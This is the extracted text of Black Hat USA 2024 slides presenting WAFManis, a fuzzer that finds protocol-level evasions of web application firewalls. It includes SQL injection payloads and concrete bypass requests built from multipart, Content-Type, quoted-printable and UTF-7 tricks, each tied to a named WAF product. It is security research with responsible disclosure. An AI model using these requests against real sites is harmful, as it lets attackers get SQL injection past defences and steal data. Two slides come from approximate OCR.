---
title: "Break the Wall from Bottom Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls"
speakers: ["Qi Wang", "Jianjun Chen", "Run Guo", "Chao Zhang", "Haixin Duan"]
conference: "Black Hat"
conference_full: "Black Hat USA 2024"
edition: "USA"
year: 2024
source_pdf: "Black Hat USA 2024 slides/Qi Wang & Jianjun Chen & Run Guo & Chao Zhang & Haixin Duan_Break the Wall from Bottom Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls.pdf"
pages: 50
sha256: "89f9599305163feb2b945b3d1d9f048d2b525d5f6ef23421b0e7e74af06c21e0"
text_chars: 16470
ocr_pages: 2
has_ocr: true
redacted_secrets: 0
ocr_confidence: 76.7
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:40:08Z"
---
# Break the Wall from Bottom Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls

**Speakers:** Qi Wang, Jianjun Chen, Run Guo, Chao Zhang, Haixin Duan  
**Conference:** Black Hat USA 2024  
**Source:** `Black Hat USA 2024 slides/Qi Wang & Jianjun Chen & Run Guo & Chao Zhang & Haixin Duan_Break the Wall from Bottom Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls.pdf` (50 pages)


## Slide 1

Break the Wall from Bottom: Automated Discovery of Protocol-Level Evasion Vulnerabilities in Web Application Firewalls

Speaker: Qi Wang(Eki)

Contributors: Jianjun Chen, Run Guo, Chao Zhang, Haixin Duan

#BHUSA @BlackHatEvents

## Slide 2

#### Talk Roadmap

##### v **What are WAFs and how do they work?**

v **How do we discover new evasion cases automatically?** v **How to bypass WAF at the protocol-level like a Pro?**

v **Bonus: Three useful tactics to bypass WAFs at the protocol-level**

#BHUSA @BlackHatEvents

2

## Slide 3

#### WebApps Security Risk

v WebApp uses parameters in HTTP request messages as user inputs v Malicious user inputs can hijack the control flow of the WebApp

A code snippet from a PHP WebApp with SQL injection vulnerability

#BHUSA @BlackHatEvents

3

## Slide 4

How WAF Protect WebApp from Security Risk? vWAFs monitor WebApp traffic to block malicious HTTP requests Ø Virtual Patch: protect the WebApp before the developers release the patch.

User
WAF
?id=0 union select * from secret

WAF

WebApp

###### **Attacker**

#BHUSA @BlackHatEvents

4

## Slide 5

#### The never-ending battle between hackers and WAFs vCloudflare research* shows lots of activity since Log4jShell

Ø Hackers have been looking for ways to bypass WAF Ø _After ${jdni got blocked, the hackers applied encoding methods & log4j features_

#BHUSA @BlackHatEvents

*https://blog.cloudflare.com/exploitation-of-cve-2021-44228-before-public-disclosure-and-evolution-of-waf-evasion-patterns5 /

## Slide 6

#### The Working Principle of WAFs

v **Parse -> Match -> Apply**

Variable Operator Action ARGS "@contains ʹor(1=1)#" "deny" ② Matching

Action

GET / HTTP/1.1 Content-Type: ARGS: ① Parsing application/json Key: id Value: 1’or(1=1)# {”id”:”1’or(1=1)# ”} ③ **Deny request Won’t send to server Attacker WAF WebApp**

#BHUSA @BlackHatEvents

6

## Slide 7

#### Wait a minute **？** Looks like a weak rule **！**

v Just change the case of keywords and use ‘>’ instead of ‘=’ v Now you find **payload-level evasion tactics**

**Attacker**

GET / HTTP/1.1 Content-Type: application/json {“id”:“1’Or(1>0)#”}

**_Parsing_**

ARGS: Key: id Value: 1’Or(1>0)# Forward SQLi Request

Response with leaked data

**WAF** ARGS "@contains ʹor(1=1)#" "deny"

**WebApp**

#BHUSA @BlackHatEvents

7

## Slide 8

#### What if the rules become Insane **？** v Vendors can configure their rules and only allow number values.

Attacker

ARGS "@contains **[^0-9]** " "deny" GET / HTTP/1.1 Content-Type: **_Parsing_** ARGS: application/json Key: id Value: 1’Or(1>0)# {“id”:“1’Or(>0)# ”} Won’t forwarded to server **WAF WebApp**

#BHUSA @BlackHatEvents

8

## Slide 9

#### Now the magic time!

##### v Just change the content-type to **_application/x-whatever+json_**

ARGS "@contains **[^0-9]** " "deny"

**Attacker**

GET / HTTP/1.1 Content-Type: application/x-whatever+json {“id”:“ 1’or(1=1)# ”} Response with leaked data

**_Parsing_**

WAF

ARGS: Key:  None Value: None

ARGS: Key:  id Value: 1’or(1=1)#

**WebApp**

#BHUSA @BlackHatEvents

9

## Slide 10

#### Now the magic time!

v Just change the content-type into **_application/x-whatever+json_** Ø WAF won’t recognize **_x-whatever+json_** as json body Ø WebApp match ‘ **_application/*+json_** ’ and still parse it as json

**WAF**

#BHUSA @BlackHatEvents

10

## Slide 11

Different parsers allows protocol-level evasion v Built-in parser, behavior may be different from each other v Developers get parameters through higher interfaces like $_GET v However, the **WAF knows nothing about these interfaces**

Hey bros, I think
the parameter is
Isn’t there two
W Really? No, it is
parameters?
I think it is  X definitely  Y
WAF WebApp  WebApp WebApp
A B C

#BHUSA @BlackHatEvents

11

## Slide 12

#### Payload-level VS Protocol-level

v Payload: Craft **payload that is not in the rules** of WAF Ø Limited to one specific vulnerability type: SQLi, XSS, … Ø Quickly fixed by updating rules

Ø Related work

- AutoSpear [Blackhat Asia 22]

   - Mutation-guide SQLi payload generator with Monte Carlo algorithm

- WAF-A-Mole [SAC '20]

   - Generate SQLi payload through adversarial machine learning

#BHUSA @BlackHatEvents

12

## Slide 13

#### Payload-level VS Protocol-level

v Payload: Craft **payload not in the rules** of WAF Ø Limited to one specific vulnerability type: SQLi, XSS, … Ø Quickly fixed by updating rules

Our Focus 👇 vProtocol: Leverage **different parsing behavior** between WAF & WebApp Ø Can be utilized to load arbitrary attack vectors including SQLi, XSS,… Ø Works well even if the WAF has strict rules at payload-level Ø Related works:

- Protocol-Level Evasion of Web Application Firewalls [Blackhat USA 12]

   - 👈 still many new cases

#BHUSA @BlackHatEvents

13

## Slide 14

#### There are so many “parameters” in HTTP

###### v WebApps consume parameters in HTTP request messages

- Ø **Path** parameters

   - /users/{id}

- Ø **Query** parameters

   - ?role=admin&id=1

- Ø **Header** parameters

   - X-MyHeader: Value

- Ø **Cookie** parameters

   - Cookie: debug=0; session=aaa;

- Ø **Body** parameters

   - x-www-form-urlencoded: a=1&b=2

   - Json {“a”:”1”}

   - Multipart/data

   - XML

https://swagger.io/docs/specification/describing-parameters/

#BHUSA @BlackHatEvents

14

## Slide 15

How to **systematically** and **efficiently** mine for **protocol-level** evasion cases in WAFs?

#BHUSA @BlackHatEvents

15

## Slide 16

#### WAFManis: An Evasion Fuzzing Framework

###### v Grammar Guided and Code Coverage Driven

https://github.com/EkiXu/WAFManis

#BHUSA @BlackHatEvents

16

## Slide 17

## Demo Video

#BHUSA @BlackHatEvents

## Slide 18

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
—. USA 2024
oee
~ WAFMANIS [SSH: 172.30.99.237]
® > @ centrifuge
> Bs fuzzing
ir) > @ fuzzing_bak e
oO > @ generator
> Bt initial_seed_bak °
> Ml venv
Q > lim webapp_validator »
® gitignore
re) @ config.py M
@ fuzzer.py M
@ README.md
& requirements.txt
@ utils.py
@ README.md
> Ba mutator
> Ml waf_validator
® gitignore
@ README.md M
@
> MAVEN
‘@ config.py ../atheris_fuzzer M X @ config.py generator M
ears: 2 WAFManis [SSH: 172.30.99.237]
@ app.py M
fuzzer > atheris_fuzzer > @ config.py >...
1, WAF_HOST = "safeline.waf.server—config.zip"
2 WAF_PORT = 31080
EXPECTED_TAINT =
3
+
<
APP_PORT = 6000
9 QUEUE_DIR = './fuzzing/queue'
10| SOLUTION_DIR = "./fuzzing/solution/safeline/flask"
11 DEBUG = False
12 WEBAPP_VALIDATE_CODE = 299
13 WAF_VALIDATE_CODE = 299
14| ALIDATE_MODE = "strict"
@ fuzzer.py M
Configured to test safeline 5.0.0
fixed in the lastest version
© (venv) eki@DUBHE-VM:~ /WAFManis/fuzzer/atheris_fuzzer$ 0
Sti: 4 UTF-8 LF {} Python 3.10.1264-bit @ O
#BHUSA @BlackHatEvents
```

## Slide 19

## Challenges we addressed

#BHUSA @BlackHatEvents

## Slide 20

#### How to generate high quality test-inputs?

v Legacy Fuzzer

Ø Put raw HTTP requests in the corpus Ø Mutate with raw bytes Ø Most of the test-inputs are invalid or payload-missing

GET / HTTP/1.1 Content-Type: application/json {”id”:”1’Or(1>0)# ”}

GÿT / HTTP/1.1 Conten:POST {”id”:”1’Or(1>0)# ”} {”id”:”1’r(1>0)# ”}

GÿT / HTTP/1.1 Content-Type: application/json

{”id”:”} 20

#BHUSA @BlackHatEvents

## Slide 21

#### WAFManis: Generator

v Generate initial inputs with HTTP Grammar Ø **Extract** grammar from the RFCs

Ø **Build** the request from the root node Ø **Dump** the corresponding HTTP request when executing

dash-boundary  --boundary
RFC7230
①
MIME-headers
②
RFC2231
body body-part ③
RFC7578 body-value <SQLi payload>
…
closing boundary --boundary--

--boundary Content-Disposition: form-data; name="id";

1' union select password from users limit 1---boundary-

#BHUSA @BlackHatEvents

21

## Slide 22

#### WAFManis: Mutator

###### v Directed mutation

Ø Grammar-level: duplicate or delete non-leaf nodes Ø Byte-level:  delete or add a single byte in leaf nodes or encode leaf nodes. Ø Specifically, do not delete or add bytes to the payload

-- boundary

-- boundary
dash-boundary
MIME-headers
body-part
body body-value
body-part
closing boundary --boundary--

<SQLi payload>

closing boundary

--boundary--

Content-Disposition: form-data; name="id"; 1' union select password from users limit 1-Content-Disposition: form-data; name="id"; 1' union select password from users limit 1---boundary-

#BHUSA @BlackHatEvents

22

## Slide 23

#### How to get an effective feedback?

###### v Black-box Fuzzer

Ø Generate test-inputs blindly, which is inefficient

###### v Grey-box Fuzzer

Ø Guide the fuzzing process with target code coverage feedback, e.g. AFL Ø However, commercial WAFs are **closed-source without code or binary**

#BHUSA @BlackHatEvents

23

## Slide 24

#### How to get an effective feedback?

v Utilize code coverage of open-source HTTP parsers to guide testing Ø Both parsers are implemented to parse HTTP requests with similar logic Ø The more feature branches we covered, the more differences we found

#BHUSA @BlackHatEvents

24

## Slide 25

#### How to detect successful evasion automatically?

###### vLegacy fuzzers

Ø Rely on program exceptions, such as crashes or hangs

###### vProtocol-level WAF evasions

Ø Silent and won’t trigger crashes.

Ø Requests are **benign at WAF Side** while **harmful at WebApp Side** Ø WAF may modify original request message

#BHUSA @BlackHatEvents

25

## Slide 26

#### WAFManis: Validator

###### vWeb Validator

Ø Return all parsed parameters

- Indicate how WebApp parses HTTP requests.

- Test Target in the fuzzing process

@app.route("/", methods=['GET', 'POST',]) def parse1(): return (dumps({ "args":flask.request.args, "form":flask.request.form, "json":flask.request.json \ if flask.request.is_json else None}) ,APP_S,[("Content-Type","application/json")])

#BHUSA @BlackHatEvents

26

## Slide 27

#### WAFManis: Validator

###### vWAF Validator：

###### Ø Return with **_SWAF_PASS_** and the exact HTTP request

- Quickly know which request passed

- Get the **exact forwarding request** to learn how WAFs will modify the request

#BHUSA @BlackHatEvents

27

## Slide 28

#### WAFManis: Validator

###### v2-Step-Validation：

Ø WAFs may **modify** the original requests, Ø WAF Validator **saves** the request samples Ø **Sends** the samples to WebApp for 2<sup>nd</sup> validation.

#BHUSA @BlackHatEvents

28

## Slide 29

#### Too many duplicate cases :-(

v There are too many “optional” fields in the HTTP message Ø Many successful evasion cases **look different** but the same

GET / HTTP/1.1 Content-Type: application/xajson GET / HTTP/1.1 Content-Type: application/x{”id”:”1’Or(1>0)# ”} ajson;c=1 GET / HTTP/1.1 Content-Type: application/x{”id”:”1’Or(1>0)# ”} ajson; a=2 {”id”:”1’Or(1>0)# ”}

GET / HTTP/1.1 Content-Type: application/x-ajson; {”id”:”1’Or(1>0)# ”}

#BHUSA @BlackHatEvents

29

## Slide 30

#### WAFManis: Centrifuge

vMinimize and re-verify evasion Ø Removing useless nodes iteratively. Ø Avoid redundant mutation and help find unique samples. Ø 2-Step Verification to exclude false positive samples.

1. Delete node

WAF
Centrifuge
Validator
2. Bypassed
3. Replay real request
WebApp
Validator
4. Parsed correctly

#BHUSA @BlackHatEvents

30

## Slide 31

Talk is cheap, Look at what we found!

#BHUSA @BlackHatEvents

## Slide 32

#### Evaluation Setup

###### vWebApp Framework

Ø Top 20 Popular OSS WebApp Frameworks

###### vWAF:

- Ø 8 Commercial WAF:

- Selected by global market share report

- Ø 6 Open-source WAF

   - Selected by “WAF” topic on GitHub

#BHUSA @BlackHatEvents

32

## Slide 33

#### What did we find **？**

v All tested web frameworks accept some non-regular requests v Most WAFs can be easily bypassed with specific HTTP requests

1.Affected web framework indicates the influence of all bypass use cases for corresponding WAF

#BHUSA @BlackHatEvents

33

## Slide 34

Tactics-1: Parameter Type Confusion First of all, the WAF needs to choose correct parser

#BHUSA @BlackHatEvents

## Slide 35

Tactics-1: Parameter Type Confusion v **Case 1:** Multiple Content-Type Ø Flask uses the last Content-Type header to indicate body type, Ø ModSecurity resolves the first header

POST / HTTP/1.1 Content-Type: application/xml Content-Type: application/x- **_Parsing_** www-form-urlencoded <!--&id=1’or(1=1)#&-->

ARGS: Key:  None Value: None ARGS: Key:  id Value: 1’or(1=1)# **Flask App** is xml is url params

Response with leaked data **Nginx& Modesurity** is xml

#BHUSA @BlackHatEvents **35**

35

## Slide 36

Tactics-1: Parameter Type Confusion v **Case 1:** Multiple Content-Type Ø Flask (Python) uses a dictionary to store HTTP headers

#BHUSA @BlackHatEvents

36

## Slide 37

#### Tactics-1: Parameter Type Confusion

v **Case 2:** Fake file parameter Ø WAF won’t apply SQLi rule to file parameter Ø The WAF parser thinks it is a file because there is only one header and there is a filename parameter, while PHP parses it as normal parameters

--a Content-Disposition:form-data; name=id;\r\rContent-TransferEncoding: filename="" 1’or(1=1)# --a

Response with leaked data

**_Parsing_**

**Alibaba Cloud WAF**

**File** : filename: “” Content:1’or(1=1)#

ARGS: Key:  id Value: 1’or(1=1)#

**PHP-based App**

Is a param #BHUSA @BlackHatEvents **37**

is a file

37

## Slide 38

### Tactics-2: Malformed Parameter Where WAFs Fail, WebApps Succeed

#BHUSA @BlackHatEvents

## Slide 39

#### Tactics-2: Malformed Parameter

v **Case 3:** Malformed Boundary Parameter Ø The attacker crafted a boundary parameter with a quote. Ø Cloudflare WAF could not parse it correctly

Content-Type: multipart/formdata; boundary=“a”; --a Content-Disposition:form-data; name=id;

1’or(1=1)#

1’or(1=1)# --a

Response with leaked data

**_Parsing_**

**Cloudflare WAF**

boundary: **“a”** ARGS: Key:  None Value: None

Keep quote

boundary: a ARGS: Key:  id Value: 1’or(1=1)#

**WebApp**

Remove quote

#BHUSA @BlackHatEvents **39**

39

## Slide 40

#### Tactics-2: Malformed Parameter

v **Case 4:** Malformed Boundary Separator Ø The attacker crafted an in-complete boundary separator

• Fortinet WAF could not parse it correctly

• PHP tolerated the in-complete structure and parsed SQLi payload.

POST / HTTP/1.1 Content-Type: multipart/form-data; boundary=a;

--a Content-Disposition: ~~form-data;~~ name=id; 1’or(1=1)# ~~--a--~~

Response with leaked data

**_Parsing_**

**Fortinet WAF**

ARGS:

Key:  None Value: None

failure

ARGS: Key:  id Value: 1’or(1=1)#

**PHP-based WebApp**

tolerate #BHUSA @BlackHatEvents **40**

40

## Slide 41

#### Tactics-2: Malformed Parameter

##### v **Bonus: The smallest body that PHP can tolerate as valid multipart**

#BHUSA @BlackHatEvents

41

## Slide 42

### Tactics-3: RFC Support Gap WAF is MAD? Try WebApp dialects!

#BHUSA @BlackHatEvents

## Slide 43

#### Tactics-3: RFC Support Gap

v **Case 5** : Deprecated CTE header

Ø In **RFC 7578** , the recommendation was deprecated and senders SHOULD NOT generate any parts with a Content-Transfer-Encoding header field. However, Go-base WebApps support it

... --boundary Content-Disposition:form-data;name=id; Content-Transfer-Encoding:quotedprintable =31=27=6f=72=28=31=29=23 --boundary

Response with leaked data

**_Parsing_**

ARGS: Key:  id Value: =31=27.. ARGS: Key:  id Value: 1’or(1=1)#

decode
#BHUSA @BlackHatEvents 43

**Go-based App**

**Google Cloud Armor** no-decode

43

## Slide 44

#### Tactics-3: RFC Support Gap

v **Case 5:** Deprecated CTE header

Ø The MIME library of Go SDK still supports Content-Transfer-Encoding

#BHUSA @BlackHatEvents

44

## Slide 45

#### Tactics-3: RFC Support Gap

v **Case 6:** Charset Support

Ø According to RFC 1866,  application/x-www-form-urlencoded has no “charset” Ø Most WAF ignored this parameter for this MIME type, but Django will parse it.

POST / HTTP/1.1 Content-Type: application/xwww-form-urlencoded; **_Parsing_** charset=utf-7;

+AGkAZA=+ADEAJwBvAHIAKAAxACkAIw-

Response with leaked data

**Azure WAF**

ARGS: Key:  +AGkA… Value: +ADE...

ARGS: Key:  id Value: 1’or(1=1)#

**Django App**

no-decode

decode

**45**

#BHUSA @BlackHatEvents

45

## Slide 46

#### Tactics-3: RFC Support Gap

v **Case 6:** Charset Support

Ø Unexpected featured support in Django (Fixed in ver.5.0)

#BHUSA @BlackHatEvents

46

## Slide 47

#### WAF affected by Three Tactics

Found **311** evasion samples across **14x20**

WAF and WebApp Combinations

#BHUSA @BlackHatEvents

47


> Recovered by OCR — confidence 78/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA 2024
A. Malformed Parameter Structure Parameter Type Confusion @ RFC Support Gap
= Naxis 5
v
iL Modsecurity 4
SS LSE ESEFES EERE LF SES
GO ODS eo < wes & OES
Web Application
```

## Slide 48

#### Responsible Disclosure

###### v Response from affected WAF and WebApp Vendors

Received Confirmed Fixed
11 vendors 9 vendors 8 vendors

#BHUSA @BlackHatEvents

48

## Slide 49

#### Black Hat Sound Bytes

v Parsing parameters give WAFs visibility but also create a vulnerability v We shared a new framework: **_WAFManis_** **

Ø Automated **_CGF_** tool of protocol-level WAF evasions

v Three tactics in payload-level WAF evasion

Ø Parameter Type Confusion Ø Malformed Parameter

Ø RFC Support Gap

**: https://github.com/EkiXu/WAFManis

#BHUSA @BlackHatEvents

49

## Slide 50

Paper

# Thanks for listening! Any questions? Qi Wang,Tsinghua University

**Tool**

#BHUSA @BlackHatEvents
